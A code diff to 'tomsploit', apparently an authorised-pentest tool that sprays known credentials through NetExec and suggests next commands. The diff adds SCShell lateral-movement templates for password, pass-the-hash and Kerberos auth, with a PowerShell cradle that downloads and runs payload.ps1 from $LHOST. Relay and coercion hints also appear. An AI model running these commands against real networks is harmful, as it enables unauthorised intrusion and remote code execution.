@@ -79,6 +79,10 @@ PORT_PROBE_TIMEOUT = 2.0
 MAX_CONSECUTIVE_TIMEOUTS = 3
 BANNER_WIDTH = 60
 DEFAULT_MAX_CIDR_HOSTS = 1024
+# Each attempt is a separate nxc process (~1-2s of interpreter startup before
+# a packet moves), so a wordlist turns into hours of pure spawn overhead.
+# Refuse past this unless --force; hydra is the right tool for wordlists.
+DEFAULT_MAX_ATTEMPTS = 1000
 
 
 class AuthType(str, Enum):
@@ -108,6 +112,9 @@ class Config:
     debug: bool
     no_port_probe: bool
     paired: bool = False
+    domain: str = ""                        # -d: explicit AD domain for nxc
+    force: bool = False                     # bypass the spawn-budget guard
+    max_attempts: int = DEFAULT_MAX_ATTEMPTS
 
 
 @dataclass(frozen=True)
@@ -181,6 +188,20 @@ class TargetResult:
     lockout_threshold: int | None = None   # None=unknown, 0=disabled, N=threshold
     lockout_window: str = ""               # e.g. "30 minutes" (reset window)
     lockout_checked: bool = False
+
+
+def tasks_per_target(cfg: Config) -> int:
+    """(protocol, scope) pairs scheduled per target, worst case.
+
+    Single source of truth: the banner and the spawn-budget guard both need
+    this, and when they each computed it inline they drifted — the banner
+    forgot the kerberos exclusion and over-reported by 5 tasks/target under
+    -k, advertising attempts that are never scheduled."""
+    n = len(cfg.protocols)
+    if not cfg.kerberos:
+        # local-auth scope is only scheduled when not using a ticket cache
+        n += sum(1 for p in cfg.protocols if p in LOCAL_AUTH_PROTOCOLS)
+    return n
 
 
 def success_sort_key(s: Success) -> tuple[int, int]:
@@ -343,7 +364,7 @@ def _dc_name_hint(target_info: str) -> bool:
 
 
 def detect_dc(target_info: str, ldap_open: bool, ldap_info: str = "",
-              role_flag: bool = False) -> bool:
+              role_flag: bool = False, domain_hint: str = "") -> bool:
     """Signal-based DC detection, strongest signal first:
 
       1. nxc explicitly flags the DC role in its output  -> definite.
@@ -359,7 +380,8 @@ def detect_dc(target_info: str, ldap_open: bool, ldap_info: str = "",
     if role_flag:
         return True
 
-    domain = extract_domain(target_info) or extract_domain(ldap_info)
+    domain = (extract_domain(target_info) or extract_domain(ldap_info)
+              or (domain_hint or ""))
     has_ad_domain = bool(domain) and domain.upper() != "WORKGROUP"
 
     # LDAP answered (port open, or we actually got an LDAP info line back).
@@ -394,6 +416,18 @@ def extract_domain(target_info: str) -> str:
     """Pull the AD domain from nxc's [*] info line (e.g. 'domain:DANTE.local')."""
     m = re.search(r"domain:([^\s)]+)", target_info, re.IGNORECASE)
     return m.group(1) if m else ""
+
+
+def extract_ldap_attr(line: str, attr: str) -> str | None:
+    """Pull `attr: value` out of an nxc LDAP output line.
+
+    Anchored on the attribute name rather than split(':', 1), because the
+    line carries an nxc prefix that can itself contain a colon (an IPv6
+    target, a timestamped format) - splitting on the first colon then
+    returns the wrong half."""
+    m = re.search(rf"(?:^|[\s\[])({re.escape(attr)})\s*:\s*(.*)$", line,
+                  re.IGNORECASE)
+    return m.group(2).strip() if m else None
 
 
 def extract_smb_signing(target_info: str) -> bool | None:
@@ -439,6 +473,11 @@ class SuggestRule:
     proto: str
     commands: tuple[tuple[str, str], ...]
     dc: bool | None = None
+    # admin: None = any, True = only when nxc flagged (Pwn3d!), False = only
+    # when it didn't. Note nxc decides Pwn3d! for SMB by testing ADMIN$ access,
+    # so admin=False is not "low privilege" — it is "we could not confirm admin
+    # via ADMIN$", which includes admins whose ADMIN$ is blocked.
+    admin: bool | None = None
 
 
 SUGGEST_RULES: list[SuggestRule] = [
@@ -576,6 +615,48 @@ SUGGEST_RULES: list[SuggestRule] = [
             "on it and execute it on the target"),
     )),
 
+    # ── SCShell — admin-gated, DC or not ────────────────────────────
+    # Separated out because SCShell needs no SMB FILE access: it reconfigures
+    # an existing service's binPath over MS-SCMR rather than writing a service
+    # binary, so it works where psexec/smbexec die on a blocked or missing
+    # ADMIN$. It is not SMB-free — the usual scshell.py transport is
+    # ncacn_np:\pipe\svcctl, so 445 must still be reachable. That is why
+    # these rules stay keyed on an SMB success rather than on 135/DCERPC.
+    #
+    # Gated on admin=True. Note nxc decides (Pwn3d!) by testing ADMIN$, so a
+    # real admin on a host with ADMIN$ locked down comes back UNflagged and
+    # won't see this — that caveat is noted inside the recipe itself rather
+    # than fired as a separate suggestion on every unflagged host.
+    SuggestRule(AuthType.PASSWORD, "smb", admin=True, commands=(
+        ("lateral movement via SCShell — use when psexec/smbexec fail",
+            "python3 SCShell.py {url_pw} -service-name ssh-agent\n"
+            "# alt services known to work: defragsvc\n"
+            "# Reconfigures an EXISTING service's binPath — no ADMIN$ file write.\n"
+            "# Still needs 445: the SCM is reached over \\pipe\\svcctl.\n"
+            "# Logs 7040 (service config changed), not 7045 (new service installed).\n"
+            "# SCShell> takes a FULL-path command (no output returned), e.g. a cradle:\n"
+            "#   C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
+            "#     -ep bypass iex(New-Object Net.WebClient).DownloadString('http://$LHOST/payload.ps1')"),
+    )),
+    SuggestRule(AuthType.HASH, "smb", admin=True, commands=(
+        ("lateral movement via SCShell [PtH] — use when psexec/smbexec fail",
+            "python3 SCShell.py {url_nopw} -hashes :{nthash} -service-name ssh-agent\n"
+            "# alt services known to work: defragsvc\n"
+            "# Reconfigures an EXISTING service's binPath — no ADMIN$ file write.\n"
+            "# Still needs 445: the SCM is reached over \\pipe\\svcctl.\n"
+            "# Logs 7040 (service config changed), not 7045 (new service installed).\n"
+            "# SCShell> takes a FULL-path command, e.g. a cradle:\n"
+            "#   C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
+            "#     -ep bypass iex(New-Object Net.WebClient).DownloadString('http://$LHOST/payload.ps1')"),
+    )),
+    SuggestRule(AuthType.KERBEROS, "smb", admin=True, commands=(
+        ("lateral movement via SCShell -k — use when psexec fails",
+            "python3 SCShell.py -k -no-pass {url_nopw} -service-name ssh-agent\n"
+            "# alt services known to work: defragsvc\n"
+            "# Reconfigures an EXISTING service's binPath — no ADMIN$ file write.\n"
+            "# Still needs 445: the SCM is reached over \\pipe\\svcctl."),
+    )),
+
     # ── HASH (Pass-the-Hash) ────────────────────────────────────────
     SuggestRule(AuthType.HASH, "smb", dc=False, commands=(
         ("list shares + perms [PtH]",
@@ -691,12 +772,13 @@ SUGGEST_RULES: list[SuggestRule] = [
 ]
 
 
-def build_context(s: Success, ip: str, hostname: str, is_dc: bool) -> dict[str, str]:
+def build_context(s: Success, ip: str, hostname: str, is_dc: bool,
+                  domain_fallback: str = "") -> dict[str, str]:
     """Pre-quote every value a template might substitute. Raw `ip` is the
     only un-quoted entry and is only used inside //ip/ and ip:export paths
     (an IP/hostname is shell-safe)."""
     user = s.user or ""
-    domain = s.domain or ""
+    domain = s.domain or domain_fallback or ""
     secret = s.secret or ""
     pth_hash = secret if s.is_hash else ""   # PtH templates only fire for HASH
     # secretsdump prints hashes as LMHASH:NTHASH. impacket -hashes wants the NT
@@ -758,13 +840,14 @@ def _inject_local_auth(cmd: str) -> str:
 
 
 def build_suggestions(s: Success, ip: str, hostname: str,
-                      is_dc: bool) -> list[tuple[str, str]]:
+                      is_dc: bool, domain_fallback: str = ""
+                      ) -> list[tuple[str, str]]:
     """Return [(label, command), ...] follow-ups for a success.
 
     Never raises — a malformed template is skipped rather than allowed to
     break the whole report."""
     try:
-        ctx = build_context(s, ip, hostname, is_dc)
+        ctx = build_context(s, ip, hostname, is_dc, domain_fallback)
     except Exception:
         return []
     out: list[tuple[str, str]] = []
@@ -772,6 +855,8 @@ def build_suggestions(s: Success, ip: str, hostname: str,
         if rule.auth != s.auth_type or rule.proto != s.protocol:
             continue
         if rule.dc is not None and rule.dc != is_dc:
+            continue
+        if rule.admin is not None and rule.admin != s.is_admin:
             continue
         for label, template in rule.commands:
             try:
@@ -808,6 +893,7 @@ class Reporter:
         self.cfg = cfg
         self.quiet = cfg.quiet
         self.verbose = cfg.verbose
+        self.multi = len(cfg.targets) > 1
 
     # ── scan-time framing ─
     def banner(self) -> None:
@@ -817,9 +903,7 @@ class Reporter:
         proto_label = ("all" if len(cfg.protocols) == len(ALL_PROTOCOLS)
                        else ",".join(cfg.protocols))
         n_creds = self._cred_count()
-        total = (n_creds * (len(cfg.protocols)
-                 + sum(1 for p in cfg.protocols if p in LOCAL_AUTH_PROTOCOLS))
-                 * len(cfg.targets))
+        total = n_creds * tasks_per_target(cfg) * len(cfg.targets)
         print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
         print(f"  {CYAN}{BOLD}⚡ tomsploit{RESET}  "
               f"{DIM}nxc triage → valid creds + next commands (enum only){RESET}")
@@ -888,7 +972,7 @@ class Reporter:
     @staticmethod
     def _partition(lines: list[tuple[str, str]]) -> dict:
         """Split a protocol's parsed lines into buckets the renderer needs."""
-        out = {"plus": [], "skip": [], "ordinary": [],
+        out = {"plus": [], "skip": [], "ordinary": [], "info": [],
                "valid_but": [], "alert": [], "error": [], "verify": []}
         for marker, msg in lines:
             if marker == "[+]":
@@ -897,9 +981,16 @@ class Reporter:
                 out["verify"].append(msg)
             elif marker == "[!]":
                 out["skip"].append(msg)
+            elif marker == "[*]":
+                out["info"].append(msg)
             elif marker == "[-]":
                 out[classify_failure(msg)].append(msg)
         return out
+
+    # Buckets that represent an actual credential outcome. [*] info lines are
+    # deliberately excluded: they're service banners, not results.
+    _RESULT_BUCKETS = ("plus", "skip", "ordinary", "valid_but",
+                       "alert", "error", "verify")
 
     @staticmethod
     def _icon(parts: dict) -> str:
@@ -958,9 +1049,7 @@ class Reporter:
                     continue
                 label = f"{proto.upper()} ({scope})"
                 parts = self._partition(lines)
-                if not any(parts[k] for k in
-                           ("plus", "skip", "ordinary", "valid_but",
-                            "alert", "error", "verify")):
+                if not any(parts[k] for k in self._RESULT_BUCKETS):
                     quiet_protos.append(label)
                     continue
                 # Pure wrong-password protocol → one rollup line (not a block),
@@ -978,7 +1067,7 @@ class Reporter:
                 self._print_proto_block(label, lines)
 
         if quiet_protos:
-            print(f"\n  {DIM}── Not answering / no data: "
+            print(f"\n  {DIM}── No credential results: "
                   f"{', '.join(quiet_protos)}{RESET}")
         print(f"\n{'─' * BANNER_WIDTH}")
 
@@ -995,7 +1084,7 @@ class Reporter:
         # Decide whether there's anything to show.
         showable = (parts["plus"] or parts["skip"] or parts["valid_but"]
                     or parts["alert"] or parts["error"] or parts["verify"]
-                    or (self.verbose and parts["ordinary"]))
+                    or (self.verbose and (parts["ordinary"] or parts["info"])))
         if not showable:
             return
 
@@ -1020,6 +1109,9 @@ class Reporter:
             emit(f"{YELLOW}{msg}{RESET}")
         for msg in parts["error"]:
             emit(f"{RED}{msg}{RESET}")
+        if self.verbose:
+            for msg in parts["info"]:
+                emit(f"{DIM}{msg}{RESET}")
         if self.verbose:
             for msg in parts["ordinary"]:
                 emit(f"{DIM}{msg}{RESET}")
@@ -1071,7 +1163,19 @@ class Reporter:
         if not has_anything:
             # Keep the blunt one-liner, then the tailored "where to go" block.
             print(f"\n  {RED}{BOLD}✗ No valid credentials found.{RESET}")
-            self.no_access(result)
+            if self.quiet:
+                # -q means "just creds + alarms". next_steps already returns
+                # early under quiet; this path did not, so the ~50-line
+                # playbook printed anyway and -q saved almost nothing.
+                print(f"{'═' * BANNER_WIDTH}\n")
+                return
+            if self.multi:
+                # The full playbook is near-identical for every cred-less host,
+                # so on a multi-target run it's hoisted into Next Steps and
+                # printed once against the union of open protocols.
+                self.no_access_brief(result)
+            else:
+                self.no_access(result)
             print(f"{'═' * BANNER_WIDTH}\n")
             return
 
@@ -1088,19 +1192,54 @@ class Reporter:
             self._suggestions(result)
         print(f"{'═' * BANNER_WIDTH}\n")
 
+    def no_access_brief(self, result: TargetResult) -> None:
+        openp = ", ".join(p.upper() for p in result.open_protocols) or "none"
+        print(f"    {DIM}open: {openp} — consolidated guidance in "
+              f"Next Steps below{RESET}")
+
     def no_access(self, result: TargetResult) -> None:
-        """Tailored 'you're stuck' guidance, keyed off which ports were open.
-        Scoped to tomsploit's lane — credential acquisition + the no-cred AD
+        """Tailored 'you're stuck' guidance for a single host."""
+        self._no_access_body(
+            target=result.real_ip or result.target,
+            openp=set(result.open_protocols),
+            dom=result.domain or self.cfg.domain or "<DOMAIN>",
+            is_dc=result.is_dc,
+            is_ad=result.is_dc or ("ldap" in result.open_protocols))
+
+    def no_access_playbook(self, failed: list[TargetResult]) -> None:
+        """The same guidance, printed once for a multi-target run against the
+        union of what was open across every host that yielded nothing."""
+        if not failed:
+            return
+        openp: set[str] = set()
+        for r in failed:
+            openp.update(r.open_protocols)
+        dom = next((r.domain for r in failed if r.domain), "") or self.cfg.domain
+        any_dc = any(r.is_dc for r in failed)
+        print(f"\n  {BOLD}Hosts with no access ({len(failed)}){RESET}")
+        print(f"  {DIM}{'─' * 32}{RESET}")
+        for r in failed:
+            openlist = ", ".join(p.upper() for p in r.open_protocols) or "none"
+            host = r.hostname or r.real_ip or r.target
+            dc_tag = f" {YELLOW}[DC]{RESET}" if r.is_dc else ""
+            print(f"    {RED}✘{RESET} {BOLD}{host}{RESET} "
+                  f"{DIM}({r.real_ip or r.target}){RESET}{dc_tag} "
+                  f"{DIM}— {openlist}{RESET}")
+        print(f"\n    {DIM}# commands below use <TARGET> — substitute a host "
+              f"from the list{RESET}")
+        self._no_access_body(target="<TARGET>", openp=openp,
+                             dom=dom or "<DOMAIN>", is_dc=any_dc,
+                             is_ad=any_dc or ("ldap" in openp))
+
+    def _no_access_body(self, target: str, openp: set, dom: str,
+                        is_dc: bool, is_ad: bool) -> None:
+        """Scoped to tomsploit's lane — credential acquisition + the no-cred AD
         playbook — and defers service-level enumeration to tombuster so the
         two tools don't print the same recipes.
 
-        Anti-duplication with Next Steps: when this host is a confident DC,
-        the username-harvest / AS-REP specifics live in the Next Steps section
-        (printed once, after all targets), so here we only point at them."""
-        target = result.real_ip or result.target
-        openp = set(result.open_protocols)
-        dom = result.domain or "<DOMAIN>"
-        is_ad = result.is_dc or ("ldap" in openp)
+        Anti-duplication with Next Steps: when a confident DC is involved, the
+        username-harvest / AS-REP specifics live in the Next Steps DC section,
+        so here we only point at them."""
 
         print(f"\n  {CYAN}{BOLD}🧭 No access yet — where to go next{RESET}")
         print(f"  {'─' * (BANNER_WIDTH - 2)}")
@@ -1112,13 +1251,13 @@ class Reporter:
         print(f"        {DIM}# FTP/NFS files, SNMP strings, config/backup files,{RESET}")
         print(f"        {DIM}# and reuse across hosts. A hash that failed here may{RESET}")
         print(f"        {DIM}# work elsewhere — feed it back in:{RESET}")
-        print(f"        tomsploit -t <other-host> -u users.txt -H <ntlm-hash>")
+        print("        tomsploit -t <other-host> -u users.txt -H <ntlm-hash>")
 
         # 2) AD with no foothold — username list is usually the gap.
         if is_ad:
             print(f"\n    {BOLD}AD detected — usually the username list is what's "
                   f"missing:{RESET}")
-            if result.is_dc:
+            if is_dc:
                 print(f"        {DIM}# kerbrute / RID-brute / AS-REP are in the "
                       f"Next Steps section below{RESET}")
                 if "ldap" in openp:
@@ -1198,13 +1337,28 @@ class Reporter:
         print(f"        tombuster -t {target}")
 
     # ── pre-spray account-lockout warning ─
-    def _attempts_per_user(self) -> int:
-        """How many failed logons each account could rack up this run."""
+    def _attempts_per_user(self, result: "TargetResult | None" = None
+                           ) -> tuple[int, int, int]:
+        """Failed domain logons each account could rack up this run, as
+        (total, per_protocol, n_domain_protocols).
+
+        The multiplier matters: every domain-scope protocol authenticates the
+        same credential independently, and each rejection increments
+        badPwdCount on the DC. Three passwords against a host answering SMB,
+        WMI, WinRM, RDP, MSSQL and LDAP is ~18 bad logons per account, not 3 —
+        counting only the secrets is how you lock out a domain while the tool
+        reports you are safely under the threshold.
+
+        Local-scope attempts hit the machine SAM, not AD, so they do not
+        count; neither do ssh/ftp/vnc/nfs."""
         if self.cfg.kerberos:
-            return 0
-        if self.cfg.paired:
-            return 1
-        return len(self.cfg.passwords) + len(self.cfg.hashes)
+            return 0, 0, 0
+        per_proto = (1 if self.cfg.paired
+                     else len(self.cfg.passwords) + len(self.cfg.hashes))
+        if result is None:
+            return per_proto, per_proto, 1
+        n = max(1, sum(1 for p in result.open_protocols if p in WINDOWS_PROTOS))
+        return per_proto * n, per_proto, n
 
     def lockout_warning(self, result: TargetResult) -> None:
         """Warn (before the spray) about the account-lockout policy read over
@@ -1213,10 +1367,15 @@ class Reporter:
         if not result.lockout_checked:
             return
         th = result.lockout_threshold
-        attempts = self._attempts_per_user()
+        attempts, per_proto, n_protos = self._attempts_per_user(result)
+        # Only worth spelling out when the multiplier is doing something;
+        # "(under the threshold; 1 secret(s))" just restates the number.
+        breakdown = (f"; {per_proto} secret(s) × {n_protos} domain-auth protocol(s)"
+                     if n_protos > 1 else "")
         if th is None:
             print(f"  {DIM}🔒 Lockout policy not readable anonymously — spray "
-                  f"with care (threshold unknown).{RESET}")
+                  f"with care (threshold unknown, ~{attempts} bad logons/user "
+                  f"this run).{RESET}")
             return
         if th == 0:
             print(f"  {GREEN}🔓 Lockout threshold disabled (0) — safe to spray."
@@ -1228,10 +1387,11 @@ class Reporter:
               f"{th} bad attempts{win}.{RESET}")
         if attempts and attempts >= th:
             print(f"  {sev}   ~{attempts} secret(s)/user this run WILL lock "
-                  f"accounts. Trim to ≤{th - 1} passwords, or use --paired.{RESET}")
+                  f"accounts{breakdown}. Trim secrets, use --paired, or cut "
+                  f"the protocol set: --protocols smb{RESET}")
         elif attempts:
             print(f"  {DIM}   ~{attempts} secret(s)/user this run (under the "
-                  f"threshold), but failed re-runs accumulate within the window."
+                  f"threshold{breakdown}), but failed re-runs accumulate within the window."
                   f"{RESET}")
 
     def _anon_smb(self, ip: str) -> None:
@@ -1326,7 +1486,9 @@ class Reporter:
             try:
                 entries = build_suggestions(
                     s, result.real_ip or result.target, result.hostname,
-                    result.is_dc)
+                    result.is_dc,
+                    "" if s.local_auth else (result.domain
+                                             or self.cfg.domain or ""))
             except Exception as exc:
                 entries = [("error", f"# suggestion builder failed: "
                             f"{exc.__class__.__name__}: {exc}")]
@@ -1406,10 +1568,16 @@ class Reporter:
         relay_hosts = [(r.hostname or r.real_ip or r.target, r.real_ip or r.target)
                        for r in results if r.smb_signing is False]
 
+        # Cred-less hosts get one consolidated playbook on a multi-target run
+        # (single-target already printed it inline).
+        failed_hosts = [r for r in results if r.scanned
+                        and not (r.successes or r.anon_smb or r.anon_ldap)]
+        show_failed = bool(failed_hosts) and self.multi
+
         has_dcs = bool(dcs_by_domain)
         has_relay = bool(relay_hosts)
         has_files = bool(self.cfg.creds_file or self.cfg.json_out or self.cfg.log_file)
-        if not has_dcs and not has_relay and not has_files:
+        if not has_dcs and not has_relay and not has_files and not show_failed:
             return
 
         print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
@@ -1479,7 +1647,10 @@ class Reporter:
             print(f"        impacket-ntlmrelayx -t smb://{relay_hosts[0][1]} "
                   f"-smb2support -i")
             print(f"\n        {DIM}# then trigger auth (coerce) toward your relay host{RESET}")
-            print(f"        # e.g. PetitPotam / PrinterBug / a clicked UNC path")
+            print("        # e.g. PetitPotam / PrinterBug / a clicked UNC path")
+
+        if show_failed:
+            self.no_access_playbook(failed_hosts)
 
         if has_files:
             print(f"\n  {BOLD}Output files{RESET}")
@@ -1551,15 +1722,24 @@ def parse_combo_file(path: str) -> tuple[list[str], list[str], list[str], list[s
     return users, passwords, hashes, warnings
 
 
-def read_value_or_file(source: str) -> list[str]:
+def read_value_or_file(source: str, label: str = "") -> list[str]:
+    """A value, or the contents of a file with that name.
+
+    The file branch is announced on stderr: `-p Password123` silently reading
+    a file that happens to be named Password123 in the cwd is a confusing five
+    minutes, and one visible line removes it."""
     if os.path.isfile(source):
         try:
             # latin-1: maps every byte 0x00-0xFF to a char, so wordlists with
             # non-UTF-8 bytes (e.g. rockyou.txt) never raise UnicodeDecodeError.
             with open(source, encoding="latin-1") as f:
-                return [line.strip() for line in f if line.strip()]
+                vals = [line.strip() for line in f if line.strip()]
         except OSError as exc:
             raise ValueError(f"Cannot read '{source}': {exc}") from exc
+        if label:
+            print(f"{DIM}[*] {label}: read {len(vals)} line(s) from file "
+                  f"'{source}'{RESET}", file=sys.stderr)
+        return vals
     return [source]
 
 
@@ -1568,7 +1748,9 @@ def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
     list of hosts."""
     out: list[str] = []
     seen: set[str] = set()
-    for raw in specs:
+    # Flatten comma lists so -t a,b,c works the same as it does in tombuster.
+    flat = [item for raw in specs for item in str(raw).split(",")]
+    for raw in flat:
         spec = raw.strip()
         if not spec:
             continue
@@ -1671,6 +1853,7 @@ class TomSploit:
         self.creds = self._build_creds()
         if not self.creds:
             raise ValueError("No credentials to test (need -p, -H, or -k).")
+        self._check_spawn_budget()
 
         # Cancellation
         self._stop = threading.Event()
@@ -1687,7 +1870,27 @@ class TomSploit:
         # a second invocation reuses the name, so tomsploit captures every
         # command's output itself and writes a single log instead.
         self._log_lock = threading.Lock()
-        self._log_buf: list[str] = []
+
+    def _check_spawn_budget(self) -> None:
+        """Every attempt is a separate nxc process, and nxc costs 1-2s of
+        Python startup before a packet moves. Fine for a handful of creds and
+        catastrophic for a wordlist: 10 users x 10 passwords across 15
+        (protocol, scope) tasks is 1,500 spawns ~ 40 minutes of pure overhead.
+        Refuse rather than let it look like a hang."""
+        tasks = tasks_per_target(self.cfg)
+        total = len(self.creds) * tasks * len(self.cfg.targets)
+        if total <= self.cfg.max_attempts or self.cfg.force:
+            return
+        mins = total * 1.5 / 60
+        raise ValueError(
+            f"{len(self.creds)} credential(s) × {tasks} protocol task(s) × "
+            f"{len(self.cfg.targets)} target(s) = {total} nxc spawns "
+            f"(~{mins:.0f} min of process startup alone, before any network "
+            f"time).\n"
+            f"  tomsploit sprays a known credential SET - for wordlists use "
+            f"hydra, or nxc directly with -p <file>.\n"
+            f"  To proceed anyway: --force. To narrow: --protocols smb,winrm  "
+            f"or raise --max-attempts {total}.")
 
     def _build_creds(self) -> list[Cred]:
         cfg = self.cfg
@@ -1768,14 +1971,20 @@ class TomSploit:
             self._redraw()
 
     # ── subprocess wrapper ─
-    def _run_proc(self, cmd: list[str], timeout: float) -> tuple[str, str, bool]:
+    def _run_proc(self, cmd: list[str], timeout: float,
+                  env: dict | None = None) -> tuple[str, str, bool]:
         """Run nxc/ssh. Returns (stdout, stderr, timed_out). Every invocation's
         output is appended to the consolidated scan log."""
         if self._stop.is_set():
             raise InterruptedError()
         try:
+            # stdin is /dev/null: without it children inherit the terminal, so
+            # anything that prompts blocks for the full timeout while silently
+            # eating your keystrokes.
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE, text=True)
+                                    stderr=subprocess.PIPE,
+                                    stdin=subprocess.DEVNULL,
+                                    text=True, env=env)
         except FileNotFoundError as exc:
             err = f"executable not found: {exc.filename}"
             self._log(cmd, "", err, False)
@@ -1801,7 +2010,12 @@ class TomSploit:
 
     def _log(self, cmd: list[str], stdout: str, stderr: str,
              timed_out: bool) -> None:
-        """Append one command and its output to the in-memory scan log."""
+        """Append one command and its output to the in-memory scan log.
+
+        No-op without -o: otherwise a long run buffers every byte of every
+        command's output for the whole scan and then throws it away."""
+        if not self.cfg.log_file:
+            return
         rec = ["$ " + " ".join(shlex.quote(c) for c in cmd)]
         if timed_out:
             rec.append("  [timed out]")
@@ -1810,8 +2024,16 @@ class TomSploit:
                 rec.append(stdout.rstrip())
             if stderr.strip():
                 rec.append("[stderr] " + stderr.rstrip())
+        # Appended to disk immediately rather than buffered until the end:
+        # a buffered log is lost entirely on a hard kill, and it grew without
+        # bound on a long run. Failures here are swallowed — logging must
+        # never be able to break a scan.
         with self._log_lock:
-            self._log_buf.append("\n".join(rec))
+            try:
+                with open(self.cfg.log_file, "a") as f:
+                    f.write("\n".join(rec) + "\n\n")
+            except OSError:
+                pass
 
     @staticmethod
     def _stderr_fallback(stdout: str, stderr: str) -> list[str]:
@@ -1833,6 +2055,10 @@ class TomSploit:
             cmd.extend(["-p", cred.secret])
         if local_auth:
             cmd.append("--local-auth")
+        elif self.cfg.domain:
+            # -d is meaningless (and contradictory) alongside --local-auth,
+            # which authenticates against the machine's own SAM.
+            cmd.extend(["-d", self.cfg.domain])
         cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
         return cmd
 
@@ -1857,6 +2083,9 @@ class TomSploit:
 
         for idx, cred in enumerate(self.creds):
             if self._stop.is_set():
+                # account for what we are abandoning, or the bar freezes
+                # mid-run and the final figure never reaches the total
+                self._tick(len(self.creds) - idx)
                 break
 
             # Skip auth methods this protocol can't use (e.g. hash vs ssh).
@@ -1887,6 +2116,11 @@ class TomSploit:
             for raw in stdout.split("\n"):
                 marker, msg = parse_nxc_line(raw.strip())
                 if marker == "[*]":
+                    # STORED as well as captured. The [*] line is the only
+                    # place nxc reports name:/domain:/signing:, and dropping
+                    # it here is what left SMB-signing (relay) detection and
+                    # the LDAP DC signal reading from an empty list.
+                    lines.append((marker, msg))
                     if not target_info:
                         target_info = msg
                 elif marker == "[+]":
@@ -1966,8 +2200,9 @@ class TomSploit:
         warned_no_sshpass = False
         legacy_mode = False   # flipped (once) when an old server rejects modern algos
 
-        for cred in self.creds:
+        for idx, cred in enumerate(self.creds):
             if self._stop.is_set():
+                self._tick(len(self.creds) - idx)
                 break
 
             # Real-ssh path tests passwords (nxc's SSH module did the same).
@@ -1985,9 +2220,13 @@ class TomSploit:
                     warned_no_sshpass = True
                 self._tick(); continue
 
-            cmd = self._ssh_cmd(target, cred.user, cred.secret, legacy=legacy_mode)
+            # sshpass reads the password from $SSHPASS rather than argv: with
+            # -p it sits in the process table for any local user to `ps`.
+            ssh_env = {**os.environ, "SSHPASS": cred.secret}
+            cmd = self._ssh_cmd(target, cred.user, legacy=legacy_mode)
             try:
-                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
+                stdout, stderr, timed_out = self._run_proc(
+                    cmd, SUBPROCESS_TIMEOUT, env=ssh_env)
             except InterruptedError:
                 break
 
@@ -2009,8 +2248,8 @@ class TomSploit:
                           f"failed — retrying with legacy algorithms{RESET}")
                 try:
                     stdout, stderr, timed_out = self._run_proc(
-                        self._ssh_cmd(target, cred.user, cred.secret, legacy=True),
-                        SUBPROCESS_TIMEOUT)
+                        self._ssh_cmd(target, cred.user, legacy=True),
+                        SUBPROCESS_TIMEOUT, env=ssh_env)
                 except InterruptedError:
                     break
                 if timed_out:
@@ -2063,11 +2302,12 @@ class TomSploit:
     ]
 
     @staticmethod
-    def _ssh_cmd(target: str, user: str, secret: str,
-                 legacy: bool = False) -> list[str]:
+    def _ssh_cmd(target: str, user: str, legacy: bool = False) -> list[str]:
         """sshpass + ssh, password auth only, non-interactive, runs a marker
-        command so success means a real shell executed it. legacy=True re-enables
-        the old host-key/KEX/cipher algorithms for ancient servers."""
+        command so success means a real shell executed it. The password comes
+        from $SSHPASS (sshpass -e), NOT argv, so it never appears in `ps`.
+        legacy=True re-enables the old host-key/KEX/cipher algorithms for
+        ancient servers."""
         marker = TomSploit._SSH_MARKER
         ssh = [
             "ssh",
@@ -2093,7 +2333,7 @@ class TomSploit:
             # identically on cmd, PowerShell, sh and bash.
             f"echo {marker}",
         ])
-        return ["sshpass", "-p", secret, *ssh]
+        return ["sshpass", "-e", *ssh]
 
     @staticmethod
     def _ssh_is_conn_error(text: str) -> bool:
@@ -2215,17 +2455,20 @@ class TomSploit:
                               f"{YELLOW}anonymous bind successful{RESET}")
                 success = True
 
-            lower = line.lower()
-            if "samaccountname:" in lower:
+            # Anchored on the attribute name - nxc's line prefix can itself
+            # contain a colon (IPv6 target), and split(':', 1) then grabs the
+            # wrong half and invents a username out of the prefix.
+            sam = extract_ldap_attr(line, "sAMAccountName")
+            if sam is not None:
                 if current_user.get("user"):
                     users.append(current_user)
-                sam = line.split(":", 1)[1].strip() if ":" in line else ""
                 # Skip computer accounts (trailing $).
                 current_user = ({"user": sam, "description": ""}
                                 if sam and not sam.endswith("$") else {})
-            elif "description:" in lower and current_user.get("user"):
-                current_user["description"] = (
-                    line.split(":", 1)[1].strip() if ":" in line else "")
+                continue
+            desc = extract_ldap_attr(line, "description")
+            if desc is not None and current_user.get("user"):
+                current_user["description"] = desc
 
         if current_user.get("user"):
             users.append(current_user)
@@ -2244,6 +2487,33 @@ class TomSploit:
             open_protos = probe_protocols(target, self.cfg.protocols)
         closed = [p for p in self.cfg.protocols if p not in open_protos]
         return open_protos, closed
+
+    # Preference order for the host's identity line. SMB's [*] carries
+    # name:/domain:/signing:; LDAP's carries name:/domain:. FTP and SSH
+    # banners carry none of it - and as_completed() hands futures back in
+    # whatever order they finish, so without this the same host could report
+    # a domain on one run and nothing on the next.
+    _INFO_PREFERENCE = ("smb-domain", "smb-local", "ldap-domain", "ldap-local",
+                        "wmi-domain", "winrm-domain", "rdp-domain",
+                        "mssql-domain")
+
+    def _select_target_info(self, result: TargetResult) -> str:
+        best = ""
+        for key in self._INFO_PREFERENCE:
+            for marker, msg in result.protocol_lines.get(key, []):
+                if marker != "[*]":
+                    continue
+                if "name:" in msg or "domain:" in msg:
+                    return msg
+                if not best:
+                    best = msg
+        if best:
+            return best
+        for _key, plines in result.protocol_lines.items():
+            for marker, msg in plines:
+                if marker == "[*]":
+                    return msg
+        return result.target_info
 
     def _scan_target(self, result: TargetResult) -> None:
         """Run all protocol + anonymous scans for an already-probed target,
@@ -2319,9 +2589,16 @@ class TomSploit:
         result.anon_smb_lines = anon_lines
         result.anon_smb = anon_success
 
+        # Pick the identity line deterministically rather than keeping
+        # whichever protocol's future happened to land first.
+        result.target_info = self._select_target_info(result)
+
